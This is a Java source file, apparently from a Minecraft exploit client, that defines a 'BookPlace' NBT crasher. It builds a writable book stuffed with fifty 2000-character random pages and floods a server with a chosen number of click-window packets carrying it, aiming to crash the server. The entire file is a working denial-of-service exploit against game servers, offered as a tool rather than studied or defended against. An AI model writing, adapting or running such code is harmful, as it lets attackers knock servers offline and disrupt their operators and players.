package dev.isnow.puppy.exploit.impl.nbt;

import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.exploit.argument.Argument;
import dev.isnow.puppy.helper.ChatHelper;
import dev.isnow.puppy.helper.NetHelper;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Random;

@ExploitInfo(
    name = "BookPlace",
    type = ExploitType.NBT,
    description = "Simple Book NBT crasher"
)
public class BookExploit extends Exploit<ItemStack> {

  public BookExploit() {
    super(() -> {
      ItemStack itemStack = new ItemStack(Items.writable_book);
      NBTTagCompound compound = new NBTTagCompound();
      NBTTagList pages = new NBTTagList();

      for (int i = 0; i < 50; i++) {
        pages.appendTag(new NBTTagString(RandomStringUtils.randomAlphabetic(2000)));
      }

      compound.setTag("pages", pages);
      itemStack.setTagCompound(compound);
      return itemStack;
    }, new Argument("packets", 0, Integer.class));
  }

  @Override
  public void execute(Object... args) {
    long start = System.currentTimeMillis();
    int packets = (int) args[0];

    ChatHelper.printMessage(
        String.format("Sending &8[&7Method: &7%s&7, Packets: &7%s&8]", getName(), args[0]));
    for (int i = 0; i < packets; i++) {
      NetHelper.sendPacket(new C0EPacketClickWindow(exploitSource().get()));
    }
    ChatHelper.printMessage(String.format("Sent &8[&7Method: &7%s&7, Time: &7%sms&8]", getName(),
        System.currentTimeMillis() - start));
  }
}
